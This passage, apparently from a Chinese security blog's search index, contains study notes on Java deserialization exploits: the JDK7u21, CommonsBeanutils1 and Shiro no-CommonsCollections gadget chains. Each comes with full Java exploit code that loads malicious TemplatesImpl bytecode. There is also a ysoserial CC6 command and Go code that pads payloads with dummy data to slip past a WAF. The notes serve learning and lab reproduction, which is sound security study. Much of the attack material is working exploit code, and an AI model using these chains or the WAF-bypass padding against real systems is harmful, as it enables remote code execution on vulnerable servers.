会清空缓冲区，导致没有回显。所以可以找到个函数来跳出或者执行后我们报错跳出又或者直接不要回显写入一句话。\n测试一下：\n\n成功\n直接使用上面注释里的__typecho_config会报错，原因是_items应该写成_items[]\n小结：感觉跟这种还是很吃力，不过跟一遍下来收获真挺大的\n反序列化的利用过程，各种利用思路，还有各种魔术方法的运用\n","slug":"Typecho1-1反序列化复现","date":"2022-10-17T11:42:19.000Z","categories_index":"PHP反序列化","tags_index":"PHP","author_index":"Longw"},{"id":"fc0657b8e278d4cdd3f372956d7c0f2c","title":"Java反序列化9笔记","content":"\n\n参考文章：p牛 Java安全漫谈19\nhttps://t.zsxq.com/06mmMZrFu\nObject Serialization Stream Protocol\nhttps://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html\nJava 序列化格式映射\nhttps://github.com/1nhann/java_ser_format\nJava反序列化数据绕WAF之加大量脏数据\nhttps://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ\n序列化流的Grammer学习：前面JDK7u21有点绕了，这次文档直接来个英文的文档，直接爆炸！！！\n不过还好，p牛的讲解很清楚，初步了解了一点\n4个核心部分：stream：stream就是指完整的序列化协议流，由三个部分组成\nmagic：final static short STREAM_MAGIC &#x3D; (short)0xaced;  \n\nversion：final static short STREAM_VERSION &#x3D; 5;  \n\nmagic和version都是short类型，也就是两个字节整型。值都是定好的，所以序列化协议流都是以\\xAC\\xED\\x00\\x05开头\ncontents：contents:\n\n\tcontent \n\n\tcontents content  \n\n这是一个递归下降的规则，contents可以由一个content组成，也可由一个contents和一个content组成，这后一个contents也可以继续由contents content和content组成。最后形成编译原理里的左递归\ncontent：content: \n\n\tobject \n\n\tblockdata  \n\n而content是由object或者blockdata组成，blockdata是一个由数组长度加数据本身组成的一个结构，里面可以填充任意内容，这也是脏数据可以填充的条件\nobject：object: \n\n\tnewObject \n\n\tnewClass \n\n\tnewArray \n\n\tnewString \n\n\tnewEnum \n\n\tnewClassDesc \n\n\tprevObject \n\n\tnullReference \n\n\texception \n\n\tTC_RESET  \n\nobject激素真正包含Java对象的一个结构，object由上面这些组成。\n\nnewObject：表示一个对象\nnewClass：表示一个类\nnewArray：表示一个数组\nnewString：表示一个字符串\nnewRnum：表示一个枚举\nnewClassDesc：表示一个类定义\npreObject：表示一个引用，可以指向任意其他类型（通过Reference ID）\nnullReference：表示null\nexception：表示一个异常\nTC_RESET：重置Reference ID\n\nnewObject就是一个实例化对象，newClass就是一个类，newClassDesc是类定义，就是对一个类的描述，比如类名，字段等\nnewObject: \n\tTC_OBJECT classDesc newHandle classdata[] &#x2F;&#x2F; data for each class \n\t\nnewClass: \n\tTC_CLASS classDesc newHandle \n\t\n\nclassDesc: \n\tnewClassDesc \n\tnullReference \n\t(ClassDesc)prevObject  \t\t\t&#x2F;&#x2F; an object required to be of type \n\n \t\t\t\t\t\t\t\t\t&#x2F;&#x2F; ClassDesc  \n\n实例化的对象有具体的数据，所以newObject的结构就比newClass队列一个classdata[]存储这些数据，其他结构就是标识符+calssDesc+newHandle\nclassDesc是一个普通的类定义，可以是null，可以是指针指向前面出现过的类定义，可以理解为newClassDesc的一个封装\nnewHandle是一个唯一的ID，每个结构都会有一个ID，从0x7E0000开始，遇到下一个结构就加一，这个结构的ID被设置为唯一\nprevObject指针就是通过newHandle这个唯一的ID来定位它指向的结构\ndemo：一个简单的User类\npackage com.zkar;\n\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.io.Serializable;\nimport org.apache.commons.codec.binary.Base64;\n\n\n\npublic class User implements Serializable &#123;\n\tprotected String name;\n\tprotected User parent;\n\t\n\tpublic User(String name)&#123;\n\t\tthis.name &#x3D; name;\n\t&#125;\n\t\n\tpublic void setParent(User parent)&#123;\n\t\tthis.parent &#x3D; parent;\n\t&#125;\n\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tUser user &#x3D; new User(&quot;Bob&quot;);\n\t\tuser.setParent(new User(&quot;Josua&quot;));\n\t\tByteArrayOutputStream byteSteam &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(byteSteam);\n\t\toos.writeObject(user);\n\t\tSystem.out.println(Base64.encodeBase64String(byteSteam.toByteArray()));\n\t&#125;\n&#125;\n\n\n\n将其生成序列化数据由base64编码，这里有一点注意，使用p牛的这个代码，添加的项目插件中如果使用shiro-all.jar，那么就会找不到deBaseString方法，当然可以改成encodeToString方法，想使用deBaseString那么插件包必须使用commons-codec.jar这个包，两个包不能在同一个项目中，不然默认调用shiro-all.jar，上移都没用\n主要是想看源码，发现导入了源码包也不行，才发现这个问题\nzkar：p牛是的序列化协议分析工具\nhttps://github.com/phith0n/zkar\n使用它对前面生成的序列化数据进行分析\nzkar dump -B xxxxxxx\n\n\n\n明显的包含前面的头文件magic和version\ncontents中包含一个newObject，第一部分是ClassDesc，里面有User类的信息，有类名、SerialVersionUID、父类、属性列表等\n唯一的ID值为8257536，calssdata[]数组包含实例化对象的数据，有两个属性name、parent。parent在定义时也是一个User类的对象，所以在序列化数据里是一个newObject，它的classDesc也是User类的信息，前面定义过classDesc所以这里是一个TC_REFERENCE，ID相同，因为都是指向前面的那个User类的classDesc\n这个ID只是classDesc的ID，而parent的ID则与前面不同，不同结构ID值不一样，当相同时，就指向第一个定义的，ID值要唯一\nJava序列化脏数据bypass：在Crammer学习时，提到过blockdata的数据是可以随意填充的\ncontent: \n\n\tobject \n\n\tblockdata \n\nblockdata: \n\n\tblockdatashort \n\n\tblockdatalong \n\nblockdatashort: \n\n\tTC_BLOCKDATA (unsigned byte) (byte)[size] \t\t \n\nblockdatalong: \n\n\tTC_BLOCKDATALONG (int) (byte)[size] \n\nblockdata分为两种类型，short和long，区别是可以存储的数据的大小不同\n所以选择blockdatalong作为脏数据的填充类型\n其结构分为，标示符、数据长度(4字节整型)、数据内容\n使用go调用zkar库的方法来进行脏数据的填充\n使用yso生成CC6的payload\njava -jar ysoserial-all.jar CommonsCollections6  calc.exe &gt; CC6.ser\n\n\n\nCC6 脏数据demo1：go：package main\n\nimport (\n\t&quot;io&#x2F;ioutil&quot;\n\t&quot;log&quot;\n\t&quot;strings&quot;\n\n\t&quot;github.com&#x2F;phith0n&#x2F;zkar&#x2F;serz&quot;\n)\n\nfunc main() &#123;\n\tdata, _ :&#x3D; ioutil.ReadFile(&quot;CC6.ser&quot;)\n\tserialization, err :&#x3D; serz.FromBytes(data)\n\tif err !&#x3D; nil &#123;\n\t\tlog.Fatal(&quot;parse error&quot;)\n\t&#125;\n\tvar blockData &#x3D; &amp;serz.TCContent&#123;\n\t\tFlag: serz.JAVA_TC_BLOCKDATALONG,\n\t\tBlockData: &amp;serz.TCBlockData&#123;\n\t\t\tData: []byte(strings.Repeat(&quot;a&quot;, 40000)),\n\t\t&#125;,\n\t&#125;\n\tserialization.Contents &#x3D; append(serialization.Contents, blockData)\n\t&#x2F;&#x2F; serialization.Contents &#x3D; append([]*serz.TCContent&#123;blockData&#125;,\n\t&#x2F;&#x2F; \tserialization.Contents...)\n\n\tioutil.WriteFile(&quot;cc6-padding1.ser&quot;, serialization.ToBytes(), 0o755)\n&#125;\n\n\n\n\nJava：package com.zkar;\n\nimport java.io.FileInputStream;\nimport java.io.InputStream;\nimport java.io.ObjectInputStream;\n\npublic class CC6bypass &#123;\n\tpublic static void read() throws Exception&#123;\n\t\tInputStream is &#x3D; new FileInputStream(&quot;cc6-padding2.ser&quot;);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(is);\n\t\tObject obj &#x3D; ois.readObject();\n\t\tSystem.out.println(obj);\n\t&#125;\n\t\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tread();\n\t&#125;\n\n&#125;\n\n\n\n\n可以成功弹出计算器\nCC6 脏数据demo2：demo1中的脏数据是在payload的后面，在反序列化时是直接被忽略了\n如果waf只检测前面一段，那么无法绕过waf\n所以需要将脏数据填充在payload前面\n直接改变Contents的顺序会在反序列化是抛出异常\nserialization.Contents &#x3D; append([]*serz.TCContent&#123;blockData&#125;, serialization.Contents...)  \n\n\n原因：在Java解析时进行了处理\n\n\nJava会先处理TC_RESET循环，之后\n在处理TC_RESET之外的结构时，如果第一个结构是blockdata会爆出异常，停止执行\n所以Java处理的contents里面处理TC_RESET之外的首个结构不能是blockdata、exception等\n前面填充内容可行是因为压根每处理到blockdata，在处理object之后，反序列化已经完成了\n所以换个顺序是不行的，但是Java在前面会将所有的TC_RESET去除，而TC_RESET又是object的一种结构，所以可以用TC_RESET来进行填充\n这样脏数据就会在前面，同时也在处理流程前面\ngo：package main\n\nimport (\n\t&quot;io&#x2F;ioutil&quot;\n\t&quot;log&quot;\n\n\t&quot;github.com&#x2F;phith0n&#x2F;zkar&#x2F;serz&quot;\n)\n\nfunc main() &#123;\n\tdata, _ :&#x3D; ioutil.ReadFile(&quot;cc6.ser&quot;)\n\tserialization, err :&#x3D; serz.FromBytes(data)\n\tif err !&#x3D; nil &#123;\n\t\tlog.Fatal(&quot;parse error&quot;)\n\t&#125;\n\tvar contents []*serz.TCContent\n\tfor i :&#x3D; 0; i &lt; 5000; i++ &#123;\n\t\tvar blockData &#x3D; &amp;serz.TCContent&#123;\n\t\t\tFlag: serz.JAVA_TC_RESET,\n\t\t&#125;\n\t\tcontents &#x3D; append(contents, blockData)\n\t&#125;\n\tserialization.Contents &#x3D; append(contents, serialization.Contents...)\n\tioutil.WriteFile(&quot;cc6-padding2.ser&quot;, serialization.ToBytes(), 0o755)\n&#125;\n\n\n","slug":"Java反序列化9笔记","date":"2022-09-16T11:41:59.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"4246a945c68e3de6ca09de0bdac9f5e2","title":"Java反序列化8笔记","content":"\n\n参考文章：p牛Java安全漫谈 18\nhttps://t.zsxq.com/06RBYz7un\np牛\nhttps://t.zsxq.com/063Zz3B2F\nJDK7u21反序列化漏洞分析笔记\nhttps://xz.aliyun.com/t/9704#toc-10\nJDK7u21反序列化利用链：先下载jre7u21\nhttps://www.oracle.com/cn/java/technologies/javase/javase7-archive-downloads.html\n不依赖第三方库的反序列化利用链\nequalsImpl()：反序列化的核心在于触发动态执行方法的地方\n在jdk7u21的 sun.reflect.annotation.AnnotationInvocationHandler类中有个equalsImpl方法，该方法里有明显的利用反射调用方法并执行\nmemberMethod.invoke(o)\n这个memberMethod来自于this.type.getDeclareMethods()\nequalsImpl方法将this.type类中的所有方法遍历执行\n当这个this.type是Templates类时，就会调用newTransformer和getOutputProperties方法，触发任意代码执行\n找半天没找到源码，没办法用idea反编译凑合一下\n\n调用equalsImpl()：equalsImpl是私有方法，在public方法invoke中被调用\n\n漫谈11中提到过，可以通过java.reflect.proxy来劫持一个对象内部的方法调用\n Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class},     handler);  \n第一个参数默认，第二个参数是需要代理的对象集合，第三个参数是具体的代理逻辑同时是实现InvocationHandler接口的对象\n同时AnnotationInvocationHandler就是实现了InvocationHandler接口的类，其Invoke方法中，当方法名为equals且参数类型为Object并且长度为1时，就会带调用equalsImpl方法\nequals是比较Java对象时常用的方法，另一个是compareTo\n现在需要找一个使用了equals作为比较方法的类\n在前面的java.util.PriorityQueue有比较的方法，但是它用的compareTo方法\n任意Java对象都拥有 equals 方法，它通常用于比较两个对象是否是同一个引用；而compareTo实际上 是 java.lang.Comparable 接口的方法，我在前一篇介绍 java.util.PriorityQueue 时也介绍过，通 常被实现用于比较两个对象的值是否相等。  \n这里用到的是hashset，集合set中储存的对象不允许重复，再添加对象时就会进行比较\n在HashSet的readObject方法中，将对象保存在HashMap的key处\n\n\n而在HashMap中是通过key.hashcode()去计算获得索引，当碰到相同索引的key-value是，就会被链接到链表后面\n所以，要触发比较就必须让两个需要比较的对象hash相同，是链接到同一张链表才会触发比较\n在HashMap的put方法中\n\n只有当两个不同对象的变量4的值，也就是hash相同时就会执行key.quals(k)，这样就会触发前面的equalsImpl，条件满足时就会触发代码执行\n哈希计算方法：计算hash的关键代码就是hash方法\nint hash &#x3D; hash(key); \n\nint i &#x3D; indexFor(hash, table.length);  \n\n\n这个this.useAltHashing是在构造函数时获取的\n\n会直接返回booted，而这个booted默认情况下是False\n\n所以，计算hash主要是通过hashcode\n所以，proxy对象与TemplateImpl对象的哈希是否相等，取决于hashcode()是否相等\n而hashcode()是一个Native方法\n通过proxy.hashCode()会调用到 AnnotationInvocationHandler的invoke方法，进而调用到AnnotationInvocationHandler的hashCodeImpl方法\n\n而在hashCodeImpl方法中，会遍历memberValues这个Map中的每个key和value，计算每个(127* key.hashCode())^value.hashCode()并求和\n\nfor(Iterator var2 &#x3D; this.memberValues.entrySet().iterator(); var2.hasNext(); var1 +&#x3D; 127 * \t\t\t\t((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;\n\n​         var3 &#x3D; (Map.Entry)var2.next();\n\n​      &#125;\n\n而在jdk7u21中\n\n当 memberValues 中只有一个key和一个value时，该哈希简化成 (127 * key.hashCode()) ^ value.hashCode() \n当 key.hashCode() 等于0时，任何数异或0的结果仍是他本身，所以该哈希简化成 value.hashCode() 。 \n当 value 就是TemplateImpl对象时，这两个哈希就变成完全相等  \n\n所以就要找一个hashCode是0的对象作为memberValues的key，将恶意的TemplteImpl对象作为value，这样计算出的hashCode就会相等\n爆破hashCode为0的对象：public static void bruteHashCode() &#123; \n\n\tfor (long i &#x3D; 0; i &lt; 9999999999L; i++) &#123; \n\n\t\tif (Long.toHexString(i).hashCode() &#x3D;&#x3D; 0) &#123; \n\n\t\t\tSystem.out.println(Long.toHexString(i)); \n\n\t\t&#125; \n\n\t&#125; \n\n&#125;  \n\n爆破出的第一个是f5a5a608，这是yso中使用的，也可以使用别的\n小结：这可真是头疼啊！！！！！\n生成恶意TemplateImpl对象\nTemplatesImpl obj &#x3D; new TemplatesImpl();\n\n​\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;\n\n​\t\t\tClassPool.getDefault().get(com.shiroattack.Evil.class.getName()).toBytecode()\n\n​\t\t&#125;);\n\n​\t\tsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\n​\t\tsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\n实例化AnnotationInvocationHandler对象\nString zeroHashCodeStr &#x3D; &quot;f5a5a608&quot;;\n\n​\t        &#x2F;&#x2F; 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值\n\n​\t        HashMap map &#x3D; new HashMap();\n\n​\t        map.put(zeroHashCodeStr, &quot;foo&quot;);\n\n​\t        &#x2F;&#x2F; 实例化AnnotationInvocationHandler类\n\n​\t        Constructor handlerConstructor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);\n\n​\t        handlerConstructor.setAccessible(true);\n\n​\t        InvocationHandler tempHandler &#x3D; (InvocationHandler) \t\t handlerConstructor.newInstance(Templates.class, map);\n\n其属性为TemplateImpl，同时传入key为f5a5a608，value为恶意TemplateImpl对象的map作为memberValues\n对AnnotationInvocationHandler对象做一层代理\nTemplates proxy &#x3D; (Templates) Proxy.newProxyInstance(JDK7u21.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, tempHandler);\n\n实例化HashSet对象，添加两个元素，分别是proxy和TemplateImpl对象\nHashSet set &#x3D; new LinkedHashSet();\n\n​\t        set.add(templates);\n\n​\t        set.add(proxy);\n\n之后直接序列化，反序列化，记得要将而已TemplateImpl设置到map中\nTest：package com.JDK7u21;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport org.apache.commons.codec.binary.Base64;\n\nimport javax.xml.transform.Templates;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.LinkedHashSet;\nimport java.util.Map;\n\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\npublic class Test &#123;\n\t public static void main(String[] args) throws Exception &#123;\n\t        TemplatesImpl templates &#x3D; new TemplatesImpl();\n\t        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;\n\t                ClassPool.getDefault().get(com.TemplatesImplTest.HelloTemplatesImplTest.class.getName()).toBytecode()\n\t        &#125;);\n\t        setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\n\t        String zeroHashCodeStr &#x3D; &quot;f5a5a608&quot;;\n\n\t        &#x2F;&#x2F; 实例化一个map，并添加Magic Number为key，也就是f5a5a608，value先随便设置一个值\n\t        HashMap map &#x3D; new HashMap();\n\t        map.put(zeroHashCodeStr, &quot;foo&quot;);\n\n\t        &#x2F;&#x2F; 实例化AnnotationInvocationHandler类\n\t        Constructor handlerConstructor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);\n\t        handlerConstructor.setAccessible(true);\n\t        InvocationHandler tempHandler &#x3D; (InvocationHandler) handlerConstructor.newInstance(Templates.class, map);\n\n\t        &#x2F;&#x2F; 为tempHandler创造一层代理\n\t        Templates proxy &#x3D; (Templates) Proxy.newProxyInstance(Test.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, tempHandler);\n\n\t        &#x2F;&#x2F; 实例化HashSet，并将两个对象放进去\n\t        HashSet set &#x3D; new LinkedHashSet();\n\t        set.add(templates);\n\t        set.add(proxy);\n\n\t        &#x2F;&#x2F; 将恶意templates设置到map中\n\t        map.put(zeroHashCodeStr, templates);\n\n\t        ByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t        ObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t        oos.writeObject(set);\n\t        oos.close();\n\n\t        System.out.println(barr);\n\t        ObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n\t        Object o &#x3D; (Object)ois.readObject();\n\t    &#125;\n\n\t    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception &#123;\n\t        Field field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t        field.setAccessible(true);\n\t        field.set(obj, value);\n\t    &#125;\n&#125;\n\n\n\n\n触发流程：HashSet.readObject \n计算hashCode值\n触发equals方法\n触发equalsImpl方法\n遍历TemplateImpl的方法\n恶意代码执行\nJDK8中的修复：这条链在jdk6u45和之前可以使用，6u51时修复，收费了，不管\njdk8刚出就修复了这个\n在AnnotationInvocationHandler类的readObject方法中对this.type进行了判断，当其部署AnnotationType时会抛出异常，在jdk7u21时，捕获异常后只是将这个函数返回，没有影响整个反序列化的执行过程\n在jdk8中，返回被修改为 throw new java.io.InvalidObjectException(“Non-annotation type in annotation serial stream”);  \n反序列化时会出现异常导致过程停止\n漫谈中提到，看似修复的完美，但是仍然存在问题，导致了后面的一条原生链jdk8u20的产生\n真头疼！！！\n","slug":"Java反序列化8笔记","date":"2022-09-16T11:41:51.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"12aa89fe66392175592eb0eacb1d89b4","title":"Java反序列化7笔记","content":"\n\n参考资料：p牛 Java安全漫谈17\nhttps://t.zsxq.com/067qjIa6Y\n廖雪峰老师的JavaBean教程：\nhttps://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680\nCommonsBeanutils ：Apache  CommonsBeanutils提供了对普通Java类对象(JavaBean)的一些操作方法\nCommonsBeanutils有一个静态方法 PropertyUtils.getProperty，可以让使用者调用任意JavaBean的getter方法\n同时还能递归使用，调用a对象的属性b的属性c\nPropertyUtils.getProperty(a, “b.c”);  \n在CommonsBeanutils中存在实现 java.util.Comparator接口的类\norg.apache.commons.beanutils.BeanComparator  \n其compare方法，当this.property为空则会进行直接进行比较。如果不为空，则用 PropertyUtils.getProperty分别获取两个对象的this.property属性，并比较属性值\n\nPropertyUtils.getProperty可以调用任意JavaBean的getter方法，而在TemplatesImpl利用链的第一环，TemplatesImpl#getOutputProperties()就是getter方法，这个方法在内部调用了TemplatesImpl#newTransformer() ，这被我们用来执行恶意字节码。\n\n所以， PropertyUtils.getProperty( o1, property ) 这段代码，当o1是一个 TemplatesImpl 对象，而 property 的值为 outputProperties 时，将会自动调用getter，也就是 TemplatesImpl#getOutputProperties() 方法，触发代码执行。  \n同样先创建TemplatesImpl对象，之后实例化BeanComparator，当其构造函数为空，默认的property就是空\nfinal BeanComparator comparator &#x3D; new BeanComparator();  \n\n之后使用实例化PriorityQueue对象\nfinal PriorityQueue queue &#x3D; new PriorityQueue(2, comparator); \n\n&#x2F;&#x2F; stub data for replacement later \n\nqueue.add(1); \n\nqueue.add(1);   \n\n之后使用反射将property的值设置为恶意的outputProperties，再将添加的1替换为恶意的TemplatesImpl对象。\nsetFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;); \n\nsetFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);  \n\n\n\n完整代码：package com.CommonCollections4Test;\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport org.apache.commons.beanutils.BeanComparator;\n\n\npublic class CommonsBeanutils1 &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object\n\t\t\tvalue) throws Exception &#123;\n\t\tField field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t\tfield.setAccessible(true);\n\t\tfield.set(obj, value);\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tTemplatesImpl obj &#x3D; new TemplatesImpl();\n\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;\n\t\t\tClassPool.getDefault().get(com.shiroattack.Evil.class.getName()).toBytecode()\n\t\t&#125;);\n\t\tsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t\tsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\t\t\n\t\tfinal BeanComparator comparator &#x3D; new BeanComparator();\n\t\tfinal PriorityQueue&lt;Object&gt; queue &#x3D; new PriorityQueue&lt;Object&gt;(2,\n\t\t\tcomparator);\n\t\t&#x2F;&#x2F; stub data for replacement later\n\t\tqueue.add(1);\n\t\tqueue.add(1);\n\t\t\n\t\tsetFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);\n\t\tsetFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);\n\t\t\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\toos.writeObject(queue);\n\t\toos.close();\n&#x2F;&#x2F;\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new\n\t\t\t\tByteArrayInputStream(barr.toByteArray()));\n\t\tObject o &#x3D; (Object)ois.readObject();\n\t&#125;\n\n&#125;\n\n\n\n\n\n注意：这样会报错，其不会反序列化\nException in thread “main” java.lang.NoClassDefFoundError: org/apache/commons/logging/LogFactory\n查资料说是classpath有问题，可以添加插件commons-logging.jar解决问题\nhttps://blog.csdn.net/weixin_44226789/article/details/105836908\n之后就可以正常反序列化执行代码，这个在web项目中会添加，所以不会影响实战效果\n相比于ysoserial里的CommonsBeanutils1利用链，漫谈的利用链去掉了对 java.math.BigInteger 的 使用，因为ysoserial为了兼容 property=lowestSetBit ，但实际上将 property 设置为null即可。  \nshiro利用难点：这里讨论的是当shiro没有使用CC依赖的时候如何反序列化，在没有使用CC时，会默认使用CB依赖，这时使用CB链的payload\n这样会报错， serialVersionUID 不一致，要注意序列化时的CB版本需要跟shiro的CB版本一致才行\n之后还报错，无法找到 org.apache.commons.collections.comparators.ComparableComparator  \n只是版本相同还不行，还是需要依赖CC链的反序列化\nCB本身依赖CC，但是CB的依赖不全，所以，使用CB不会导致出现问题，但是在反序列化时依赖没有的CC就会出现问题\norg.apache.commons.collections.comparators.ComparableComparator在BeanComparator类的构造函数中，没有显示传入Comparator时默认使用，comparableComparator，所以反序列化时需要这个类\n前面使用CB链发现反序列化时还是需要CC依赖，现在找不需要CC依赖的，或者说是替代comparableComparator类的，需要以下条件：\n\n实现 java.util.Comparator 接口 \n实现 java.io.Serializable 接口 \nJava、shiro或commons-beanutils自带，且兼容性强  \n\njava.lang.String$CaseInsensitiveComparator这个类是java.lang.String类下的一个内部的私有类，实现了comparator和Serializable，位于Java核心代码中，兼容性强\n\n通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对 象，用它来实例化 BeanComparator ：  \nfinal BeanComparator comparator &#x3D; new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); \n\n原来实例化 BeanComparator，直接默认的CaseInsensitiveComparator，这次使用String.CASE_INSENSITIVE_ORDER获取CaseInsensitiveComparator来实例化BeanComparator，就比以前多加一个Compare参数\n封装完整代码：package com.CommonCollections4Test;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport org.apache.commons.beanutils.BeanComparator;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\n\npublic class CommonsBeanutils1Shiro &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object\n\t\t\tvalue) throws Exception &#123;\n\t\tField field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t\tfield.setAccessible(true);\n\t\tfield.set(obj, value);\n\t&#125;\n\tpublic byte[] getPayload(byte[] clazzBytes) throws Exception &#123;\n\t\tTemplatesImpl obj &#x3D; new TemplatesImpl();\n\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;clazzBytes&#125;);\n\t\tsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t\tsetFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());\n\t\t&#x2F;&#x2F;替代\n\t\tfinal BeanComparator comparator &#x3D; new BeanComparator(null,\n\t\t\t\tString.CASE_INSENSITIVE_ORDER);\n\t\tfinal PriorityQueue&lt;Object&gt; queue &#x3D; new PriorityQueue&lt;Object&gt;(2,\n\t\t\t\tcomparator);\n\t\t&#x2F;&#x2F; stub data for replacement later\n\t\tqueue.add(&quot;1&quot;);\n\t\tqueue.add(&quot;1&quot;);\n\t\tsetFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);\n\t\tsetFieldValue(queue, &quot;queue&quot;, new Object[]&#123;obj, obj&#125;);\n\t\t&#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n\t\t&#x2F;&#x2F; 生成序列化字符串\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\toos.writeObject(queue);\n\t\toos.close();\n\t\treturn barr.toByteArray();\n\t\t&#125;\n\n&#125;\n\n\n\n\njava.util.Collections$ReverseComparator漫谈提到可用，另一个shiro无依赖的利用\n\n原理通前面CaseInsensitiveComparator 相同，所以找一下代码，看一下如何利用\nReverseComparator是java.util.Collections的内部保护类，它同样实现了Comparator和Serializable接口\n接下来要考虑的就是如何获取ReverseComparator来作为BeanComparator 的comparator\n\n同前面一样，通过Collections.reverseOrder可以获取一个ReverseComparator对象\n可以生成序列化数据，在本地测试一下\n成功弹出计算器，调式一下，流程没有错\n本地测试完整代码：package com.CommonCollections4Test;\nimport java.util.Collections;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport org.apache.commons.beanutils.BeanComparator;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport java.util.PriorityQueue;\n\npublic class CommonsBeanutils1Shiro1Test &#123;\n\tpublic static void setFieldValue(Object obj, String fieldName, Object\n\t\t\tvalue) throws Exception &#123;\n\t\tField field &#x3D; obj.getClass().getDeclaredField(fieldName);\n\t\tfield.setAccessible(true);\n\t\tfield.set(obj, value);\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tTemplatesImpl obj &#x3D; new TemplatesImpl();\n\t\tsetFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;\n\t\t\tClassPool.getDefault().get(com.shiroattack.Evil.class.getName()).toBytecode()\n\t\t&#125;);\n\t\tsetFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);\n\t\tsetFieldValue(obj, &quot;_tfactory&quot;, new 